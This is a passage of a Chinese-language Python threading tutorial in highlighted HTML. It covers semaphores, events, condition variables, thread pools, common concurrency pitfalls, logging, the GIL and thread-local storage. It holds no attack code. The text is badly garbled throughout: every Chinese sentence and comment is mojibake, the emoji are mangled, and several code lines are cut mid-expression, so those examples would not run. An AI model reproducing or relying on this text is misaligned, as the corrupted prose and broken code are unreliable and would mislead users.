<span class="hljs-comment"># å…è®¸æœ€å¤š 3 ä¸ªå¹¶å‘å·¥ä½œçº¿ç¨‹</span>
semaphore = threading.Semaphore(<span class="hljs-number">3</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">access_resource</span>(<span class="hljs-params">worker_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"â³ Worker <span class="hljs-subst">{worker_id}</span> waiting..."</span>)
    <span class="hljs-keyword">with</span> semaphore:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ‘· Worker <span class="hljs-subst">{worker_id}</span> acquired semaphore"</span>)
        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿå·¥ä½œ</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ… Worker <span class="hljs-subst">{worker_id}</span> released semaphore"</span>)
<span class="hljs-comment"># å¯åŠ¨ 10 ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œä½†åªæœ‰ 3 ä¸ªå¯ä»¥åŒæ—¶è¿è¡Œ</span>
threads = [
    threading.Thread(target=access_resource, args=(i,))
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)
]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
</code></pre>
<p>å®é™…åº”ç”¨åœºæ™¯ï¼šé™åˆ¶å¹¶å‘æ•°æ®åº“è¿æ¥ã€API é€Ÿç‡é™åˆ¶å’Œèµ„æºæ± ç®¡ç†ã€‚</p>
<h6 data-id="heading-15">4. äº‹ä»¶ï¼ˆçº¿ç¨‹åè°ƒï¼‰</h6>
<p>å…è®¸çº¿ç¨‹ç­‰å¾…ä¿¡å·åå†ç»§ç»­ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>

<span class="hljs-comment"># å…±äº«äº‹ä»¶å’Œç»“æœ</span>
start_event = threading.Event()
results: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = []
<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">worker_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"â³ Worker <span class="hljs-subst">{worker_id}</span> waiting for start signal..."</span>)
    start_event.wait()  <span class="hljs-comment"># Block until event is set</span>
    
    <span class="hljs-comment"># æ¨¡æ‹Ÿæ—¶é—´å¯å˜çš„å·¥ä½œ</span>
    time.sleep(random.random())
    results.append(<span class="hljs-string">f"Worker <span class="hljs-subst">{worker_id}</span> completed"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âœ… Worker <span class="hljs-subst">{worker_id}</span> finished"</span>)
<span class="hljs-comment"># åˆ›å»º 5 ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œå…¨éƒ¨ç­‰å¾…</span>
workers = [
    threading.Thread(target=worker, args=(i,))
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)
]
<span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> workers:
    w.start()
<span class="hljs-comment"># ä¸»çº¿ç¨‹å‡†å¤‡èµ„æº</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ”§ Preparing resources..."</span>)
time.sleep(<span class="hljs-number">2</span>)
<span class="hljs-comment"># åŒæ—¶é‡Šæ”¾æ‰€æœ‰å·¥ä½œçº¿ç¨‹</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸš€ Releasing all workers!"</span>)
start_event.<span class="hljs-built_in">set</span>()
<span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> workers:
    w.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“Š Results: <span class="hljs-subst">{results}</span>"</span>)
</code></pre>
<p>æ¨¡å¼ï¼šéå¸¸é€‚åˆéœ€è¦å¤šä¸ªçº¿ç¨‹åŒæ—¶å¯åŠ¨å¹¶â€œå‡†å¤‡å°±ç»ªâ€çš„åœºæ™¯ã€‚</p>
<h6 data-id="heading-16">5. æ¡ä»¶ï¼ˆå¤æ‚åè°ƒï¼‰</h6>
<p>æœ€å¼ºå¤§çš„åŸè¯­ â€”â€” å°†é”ä¸ç­‰å¾…/é€šçŸ¥æœºåˆ¶ç»“åˆã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Deque, TypeVar

T = TypeVar(<span class="hljs-string">'T'</span>)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BoundedBuffer</span>:
    <span class="hljs-string">"""
    çº¿ç¨‹å®‰å…¨çš„å¸¦è¾¹ç•Œç¼“å†²åŒºï¼Œå®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ã€‚
    å±•ç¤ºç°å®ä¸­ Condition çš„ä½¿ç”¨æƒ…å†µã€‚
    """</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, capacity: <span class="hljs-built_in">int</span></span>):
        self.capacity = capacity
        self.buffer: Deque[T] = deque()
        self.lock = threading.Lock()
        <span class="hljs-comment"># ä¸¤ä¸ªæ¡ä»¶å˜é‡å…±äº«åŒä¸€ä¸ªé”</span>
        self.not_empty = threading.Condition(self.lock)
        self.not_full = threading.Condition(self.lock)
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">self, item: T</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""ç”Ÿäº§è€…å°†æ•°æ®æ·»åŠ åˆ°ç¼“å†²åŒºã€‚"""</span>
        <span class="hljs-keyword">with</span> self.not_full:  <span class="hljs-comment"># è‡ªåŠ¨è·å–é”</span>
            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.buffer) &gt;= self.capacity:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“¦ Buffer full, producer waiting..."</span>)
                self.not_full.wait()  <span class="hljs-comment"># é‡Šæ”¾é”å¹¶ç­‰å¾…</span>
            
            self.buffer.append(item)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“¦ Produced: <span class="hljs-subst">{item}</span> (buffer size:...})"</span>)
            self.not_empty.notify()  <span class="hljs-comment"># å”¤é†’ä¸€ä¸ªæ¶ˆè´¹è€…</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>) -&gt; T:
        <span class="hljs-string">"""æ¶ˆè´¹è€…ä»ç¼“å†²åŒºç§»é™¤æ•°æ®ã€‚"""</span>
        <span class="hljs-keyword">with</span> self.not_empty:
            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.buffer) == <span class="hljs-number">0</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“¥ Buffer empty, consumer waiting..."</span>)
                self.not_empty.wait()
            
            item = self.buffer.popleft()
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“¥ Consumed: <span class="hljs-subst">{item}</span> (buffer size: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(self.buffer)}</span>)"</span>)
            self.not_full.notify()  <span class="hljs-comment"># å”¤é†’ç”Ÿäº§è€…</span>
            <span class="hljs-keyword">return</span> item
<span class="hljs-comment"># æµ‹è¯•ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼</span>
buffer = BoundedBuffer(capacity=<span class="hljs-number">3</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">producer</span>() -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
        buffer.put(<span class="hljs-string">f"Item-<span class="hljs-subst">{i}</span>"</span>)
        time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿç”Ÿäº§æ—¶é—´</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">consumer</span>() -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
        item = buffer.get()
        time.sleep(<span class="hljs-number">0.2</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿå¤„ç†æ—¶é—´</span>
t1 = threading.Thread(target=producer, name=<span class="hljs-string">"Producer"</span>)
t2 = threading.Thread(target=consumer, name=<span class="hljs-string">"Consumer"</span>)
t1.start()
t2.start()
t1.join()
t2.join()
</code></pre>
<p>Condition å¼ºå¤§çš„åŸå› ï¼šç”¨é«˜æ•ˆçš„ç¡çœ é€šçŸ¥å–ä»£äº†å¿™ç¢Œç­‰å¾…ï¼ˆåœ¨å¾ªç¯ä¸­æ£€æŸ¥æ ‡å¿—ï¼‰çš„çŠ¶æ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22248b1a3ee245e78eeaed79dbc2fd75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590897&amp;x-signature=POCfdxkYcnSO7SxHm6M9AvUYkZI%3D" alt="Java ä¸­çš„ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼šæµæ°´çº¿ç”Ÿäº§" loading="lazy"/></p>
<h2 data-id="heading-17">ç”Ÿäº§çº§æœ€ä½³å®è·µ</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è°ˆè°ˆç”Ÿäº§ç¯å¢ƒä¸­çš„ä»£ç ï¼Œç‰¹åˆ«æ˜¯é‚£ç§èƒ½å¤„ç†æ•°ç™¾ä¸‡è¯·æ±‚ã€æ”¯æŒæ¨ªå‘æ‰©å±•ï¼Œè€Œä¸”ä¸ä¼šåœ¨å‡Œæ™¨ 3 ç‚¹åµé†’ä½ çš„ä»£ç ã€‚</p>
<h5 data-id="heading-18">æ‹¥æŠ± concurrent.futures â€” å¼ƒç”¨æ‰‹åŠ¨çº¿ç¨‹ç®¡ç†</h5>
<p>åŸå§‹çº¿ç¨‹æ˜¯ç”¨æ¥å­¦ä¹ çš„ï¼Œç”Ÿäº§ä»£ç ä½¿ç”¨ <code>concurrent.futures</code>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed, wait
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Tuple</span>
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_url</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, timeout: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:
    <span class="hljs-string">"""
    è·å– URL å†…å®¹ï¼Œå¹¶å¸¦é”™è¯¯å¤„ç†ã€‚
    è¿”å› (url, result_message).
    """</span>
    <span class="hljs-keyword">try</span>:
        response = requests.get(url, timeout=timeout)
        <span class="hljs-keyword">return</span> (url, <span class="hljs-string">f"âœ… <span class="hljs-subst">{<span class="hljs-built_in">len</span>(response.content)}</span> bytes"</span>)
    <span class="hljs-keyword">except</span> requests.Timeout:
        <span class="hljs-keyword">return</span> (url, <span class="hljs-string">"âŒ Timeout"</span>)
    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> (url, <span class="hljs-string">f"âŒ <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)
<span class="hljs-comment"># æµ‹è¯• URL</span>
urls = [
    <span class="hljs-string">"https://httpbin.org/delay/1"</span>,
    <span class="hljs-string">"https://httpbin.org/delay/2"</span>, 
    <span class="hljs-string">"https://httpbin.org/status/404"</span>,
    <span class="hljs-string">"https://invalid-url-that-does-not-exist.com"</span>,
]
<span class="hljs-comment"># æ–¹æ³• 1: as_completed - ç»“æœä¸€åˆ°å°±å¤„ç†</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ¯ Method 1: as_completed (real-time processing)"</span>)
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:
    future_to_url = {
        executor.submit(fetch_url, url): url 
        <span class="hljs-keyword">for</span> url ..._to_url[future]
        <span class="hljs-keyword">try</span>:
            url, result = future.result(timeout=<span class="hljs-number">1</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  âš ï¸ <span class="hljs-subst">{url}</span> generated exception: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-comment"># æ–¹æ³• 2: map - ä¿æŒè¾“å…¥é¡ºåº</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nğŸ“Š Method 2: map (maintains order)"</span>)
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:
    results = executor.<span class="hljs-built_in">map</span>(fetch_url, urls, timeout=<span class="hljs-number">5</span>)
    <span class="hljs-keyword">for</span> url, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(urls, results):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{url}</span>: <span class="hljs-subst">{result}</span>"</span>)
<span class="hljs-comment"># æ–¹æ³• 3: wait - ç­–ç•¥æ€§æ‰¹é‡æ§åˆ¶</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nâ±ï¸ Method 3: wait (flexible completion strategy)"</span>)
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:
    futures = [executor.submit(fetch_url, url) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls]
    
    <span class="hljs-comment"># ç­–ç•¥æ€§æ‰¹é‡æ§åˆ¶, æˆ–è€…åŸºäº FIRST_COMPLETED, FIRST_EXCEPTION</span>
    done, not_done = wait(futures, timeout=<span class="hljs-number">3</span>, return_when=<span class="hljs-string">"ALL_COMPLETED"</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  Completed: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(done)}</span>, Pending: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(not_done)}</span>"</span>)
    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> done:
        url, result = future.result()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{result}</span>"</span>)
</code></pre>
<p>çº¿ç¨‹æ± å¤§å°è®¡ç®—ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os

num_cores = os.cpu_count() <span class="hljs-keyword">or</span> <span class="hljs-number">4</span>

<span class="hljs-comment"># CPU å¯†é›†å‹ä»»åŠ¡</span>
cpu_pool_size = num_cores + <span class="hljs-number">1</span>

<span class="hljs-comment"># I/O å¯†é›†å‹ä»»åŠ¡ï¼ˆæ¥è‡ªBrian Goetzçš„å…¬å¼ï¼‰</span>
wait_time = <span class="hljs-number">0.050</span>  <span class="hljs-comment"># 50ms ç­‰å¾… API å“åº”</span>
service_time = <span class="hljs-number">0.005</span>  <span class="hljs-comment"># 5ms å¤„ç†å“åº”</span>
io_pool_size = num_cores * (<span class="hljs-number">1</span> + wait_time / service_time)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"CPU pool size: <span class="hljs-subst">{cpu_pool_size}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"I/O pool size: <span class="hljs-subst">{<span class="hljs-built_in">int</span>(io_pool_size)}</span>"</span>)
</code></pre>
<p>ç”Ÿäº§æ´å¯Ÿï¼šä½¿ç”¨ä¸¤ä¸ªç‹¬ç«‹çº¿ç¨‹æ±  â€”â€” ä¸€ä¸ªç”¨äº CPU å¯†é›†å‹ä»»åŠ¡ï¼Œä¸€ä¸ªç”¨äº I/O å¯†é›†å‹ä»»åŠ¡ã€‚æ··åˆä½¿ç”¨ä¼šå¯¼è‡´æ€§èƒ½ä¸ä½³ã€‚</p>
<h5 data-id="heading-19">é¿å…å¸¸è§æ­»äº¡é™·é˜±</h5>
<h6 data-id="heading-20">é™·é˜± 1ï¼šéåŒæ­¥å…±äº«å¯å˜çŠ¶æ€</h6>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue
<span class="hljs-keyword">import</span> threading

<span class="hljs-comment"># âŒ é”™è¯¯: ç«æ€æ¡ä»¶</span>
shared_list = []
<span class="hljs-keyword">def</span> <span class="hljs-title function_">unsafe_append</span>(<span class="hljs-params">value: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        shared_list.append(value)  <span class="hljs-comment"># æ•°æ®ä¸¢å¤±æ˜¯å¿…ç„¶çš„</span>

<span class="hljs-comment"># âœ… æ­£ç¡®: ä½¿ç”¨çº¿ç¨‹å®‰å…¨é˜Ÿåˆ—</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_producer</span>(<span class="hljs-params">q: Queue, items: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:
        q.put(item)
    q.put(<span class="hljs-literal">None</span>)  <span class="hljs-comment"># æ ‡è¯†ç»“æŸçš„å“¨å…µå€¼</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_consumer</span>(<span class="hljs-params">q: Queue</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        item = q.get()
        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            q.put(<span class="hljs-literal">None</span>)  <span class="hljs-comment"># å°†å“¨å…µä¼ é€’ç»™å…¶ä»–æ¶ˆè´¹è€…</span>
            <span class="hljs-keyword">break</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Consumed: <span class="hljs-subst">{item}</span>"</span>)

<span class="hljs-comment"># ç”¨æ³•</span>
q: Queue = Queue()
producer = threading.Thread(target=safe_producer, args=(q, <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)))
consumer = threading.Thread(target=safe_consumer, args=(q,))
producer.start()
consumer.start()
producer.join()
consumer.join()
</code></pre>
<p>é»„é‡‘æ³•åˆ™ï¼šåˆ‡å‹¿åœ¨æœªåŒæ­¥çš„æƒ…å†µä¸‹å…±äº«å¯å˜çŠ¶æ€ã€‚ä½¿ç”¨ <code>Queue</code> è¿›è¡Œé€šä¿¡ã€‚</p>
<h6 data-id="heading-21">é™·é˜± 2ï¼šçº¿ç¨‹æ± æ­»é”</h6>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor

<span class="hljs-comment"># âŒ æ­»é”: çº¿ç¨‹ç­‰å¾…å…¶è‡ªèº«çš„æ± </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">deadlock_example</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_on_future</span>():
        future = executor.submit(<span class="hljs-built_in">pow</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>)
        <span class="hljs-keyword">return</span> future.result()  <span class="hljs-comment"># Blocks forever</span>
    
    executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">1</span>)
    executor.submit(wait_on_future)

<span class="hljs-comment"># âœ… è§£å†³æ–¹æ¡ˆ: åŒºåˆ†ä¸åŒçš„æ± ï¼Œæˆ–è€…å¢åŠ å·¥ä½œçº¿ç¨‹</span>
executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">2</span>)
</code></pre>
<p>æ¥è‡ª PEP 3148ï¼Œæœ‰ç»éªŒçš„å¼€å‘è€…ä¹Ÿä¼šå‡ºé”™ã€‚</p>
<h6 data-id="heading-22">é™·é˜± 3ï¼šå¼‚å¸¸æ¶ˆå¤±</h6>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ é”™è¯¯: å¼‚å¸¸æ¶ˆå¤±</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">silent_failure</span>():
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"This exception vanishes"</span>)

t = threading.Thread(target=silent_failure)
t.start()
t.join()

<span class="hljs-comment"># æ²¡æœ‰æ˜æ˜¾é”™è¯¯ - å¼‚å¸¸è¢«åå™¬äº†</span>
<span class="hljs-comment"># âœ… æ­£ç¡®: ä½¿ç”¨å¸¦å¼‚å¸¸å¤„ç†çš„æ‰§è¡Œå™¨</span>
<span class="hljs-keyword">with</span> ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:
    future = executor.submit(silent_failure)
    <span class="hljs-keyword">try</span>:
        future.result()
    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Caught exception: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p>çº¿ç¨‹å¼‚å¸¸ä¸ä¼šä¼ æ’­åˆ°ä¸»çº¿ç¨‹ï¼ŒåŠ¡å¿…æ£€æŸ¥ <code>future.result()</code>ã€‚</p>
<h5 data-id="heading-23">çº¿ç¨‹å®‰å…¨æ—¥å¿—</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> logging.handlers <span class="hljs-keyword">import</span> RotatingFileHandler
<span class="hljs-keyword">import</span> threading

<span class="hljs-comment"># é…ç½®çº¿ç¨‹å®‰å…¨çš„æ—¥å¿—è®°å½•</span>
logging.basicConfig(
    level=logging.INFO,
    <span class="hljs-built_in">format</span>=<span class="hljs-string">'%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'</span>,
    handlers=[
        RotatingFileHandler(
            <span class="hljs-string">'app.log'</span>, 
            maxBytes=<span class="hljs-number">10</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>,  <span class="hljs-comment"># 10MB</span>
            backupCount=<span class="hljs-number">5</span>
        ),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">thread_work</span>(<span class="hljs-params">thread_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    logger.info(<span class="hljs-string">f"Thread <span class="hljs-subst">{thread_id}</span> started"</span>)
    <span class="hljs-comment"># ä¸šåŠ¡é€»è¾‘</span>
    logger.info(<span class="hljs-string">f"Thread <span class="hljs-subst">{thread_id}</span> finished"</span>)

<span class="hljs-comment"># å¤šçº¿ç¨‹åŒæ—¶è®°å½•æ—¥å¿— - æ— æŸå</span>
threads = [
    threading.Thread(target=thread_work, args=(i,), name=<span class="hljs-string">f"Worker-<span class="hljs-subst">{i}</span>"</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)
]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
</code></pre>
<p>Python çš„æ—¥å¿—æ¨¡å—è®¾è®¡ä¸Šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨å®ƒä»£æ›¿ <code>print()</code>ã€‚</p>
<h2 data-id="heading-24">é«˜çº§è¯é¢˜ â€”â€” è¢«å¿½ç•¥çš„ç»†èŠ‚</h2>
<h5 data-id="heading-25">GIL é‡Šæ”¾æ—¶é—´æ·±åº¦è§£æ</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">demonstrate_gil_release</span>():
    <span class="hljs-string">"""å±•ç¤ºå“ªäº›æ“ä½œä¼šé‡Šæ”¾GILã€‚"""</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"1. Pure Python computation (GIL held)"</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):
        _ = i ** <span class="hljs-number">2</span>  <span class="hljs-comment"># CPU å¯†é›†å‹ï¼Œæœ€å°åŒ– GIL é‡Šæ”¾</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2. I/O operation (GIL released)"</span>)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'/tmp/test.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">'test'</span> * <span class="hljs-number">10000</span>)  <span class="hljs-comment"># æ–‡ä»¶ I/O é‡Šæ”¾ GIL</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"3. time.sleep() (GIL released)"</span>)
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># æ€»æ˜¯é‡Šæ”¾ GIL</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"4. C extension calls (varies)"</span>)
    <span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
    <span class="hljs-comment"># è®¸å¤š NumPy æ“ä½œä¼šé‡Šæ”¾ GIL</span>
    arr = np.random.rand(<span class="hljs-number">1000000</span>)
    result = np.<span class="hljs-built_in">sum</span>(arr)  <span class="hljs-comment"># è®¡ç®—è¿‡ç¨‹ä¸­é‡Šæ”¾ GIL</span>

demonstrate_gil_release()
</code></pre>
<p>å…³é”®è§è§£ï¼šåƒ NumPy/SciPy è¿™æ ·çš„ C æ‰©å±•åœ¨è®¡ç®—è¿‡ç¨‹ä¸­å¸¸å¸¸é‡Šæ”¾ GILï¼Œå³ä½¿ç”¨ <code>threading</code> ä¹Ÿèƒ½å®ç°çœŸæ­£çš„å¹¶è¡Œã€‚</p>
<h5 data-id="heading-26">çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆTLSï¼‰</h5>
<p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç§æœ‰æ•°æ®å‘½åç©ºé—´ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

<span class="hljs-comment"># åˆ›å»ºçº¿ç¨‹æœ¬åœ°å­˜å‚¨</span>
thread_local = threading.local()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">show_thread_data</span>():
    <span class="hljs-string">"""æ¯ä¸ªçº¿ç¨‹çœ‹åˆ°è‡ªå·±çš„æ•°æ®ã€‚"""</span>
    <span class="hljs-keyword">try</span>:
        data = thread_local.data
    <span class="hljs-keyword">except</span> AttributeError:
        data = <span class="hljs-string">"default"</span>
        thread_local.data = data
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{threading.current_thread().name}</span>: <span class="hljs-subst">{data}</span>"</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">custom_data: <span class="hljs-built_in">str</span></span>):
    thread_local.data = custom_data
    show_thread_data()

<span class="hljs-comment"># ç”¨ä¸åŒçš„æ•°æ®å¯åŠ¨çº¿ç¨‹</span>
threads = [
    threading.Thread(target=worker, args=(<span class="hljs-string">f"data-<span class="hljs-subst">{i}</span>"</span>,), name=<span class="hljs-string">f"Thread-<span class="hljs-subst">{i}</span>"</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)
]

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
</code></pre>
<p>ç”¨ä¾‹ï¼šæ•°æ®åº“è¿æ¥ã€è¯·æ±‚ä¸Šä¸‹æ–‡ã€äº‹åŠ¡çŠ¶æ€ã€‚</p>
<h5 data-id="heading-27">æ€§èƒ½å¯¹å†³ï¼šçº¿ç¨‹ vs. è¿›ç¨‹ vs. å¼‚æ­¥</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> threading
